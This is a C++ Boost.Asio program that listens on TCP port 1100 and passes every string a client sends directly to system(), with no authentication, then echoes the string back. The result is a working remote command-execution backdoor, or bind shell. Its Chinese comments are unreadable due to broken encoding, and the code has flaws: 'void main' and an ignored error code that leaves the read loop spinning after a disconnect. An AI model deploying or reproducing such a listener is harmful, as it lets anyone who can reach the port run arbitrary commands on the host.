#include<iostream>
#include<boost/asio.hpp>
#include<stdlib.h>


using namespace std;
using namespace boost::asio;

void main()
{
	io_service iosev;//io����(�������),��TCPͨ�ų�ʼ��
	ip::tcp::acceptor myacceptor(iosev, ip::tcp::endpoint(ip::tcp::v4(), 1100));
	//endpoint(Э��,�˿�)
	while (1)//����ͻ���
	{
		ip::tcp::socket mysocket(iosev);//����һ��TCPЭ��,Э����Ҫ��һ����������ʼ��
		myacceptor.accept(mysocket);//���յĶ˿���Ϣ
		cout << "�ͻ���" << mysocket.remote_endpoint().address() <<" "<<mysocket.remote_endpoint().port()<<"������"<< endl;
		while (1)//����һ���ͻ��˵�ͨ��
		{
			char receiverstr[1024] = { 0 };
			boost::system::error_code ec;//ec��洢������Ϣ
			int length = mysocket.read_some(buffer(receiverstr),ec);//�����쳣
			cout << "�յ� " << receiverstr <<"����"<<length<< endl;
			system(receiverstr);
			length = mysocket.write_some(buffer(receiverstr, length), ec);
			cout << "������Ϣ����" << length << endl;
		}
	}

}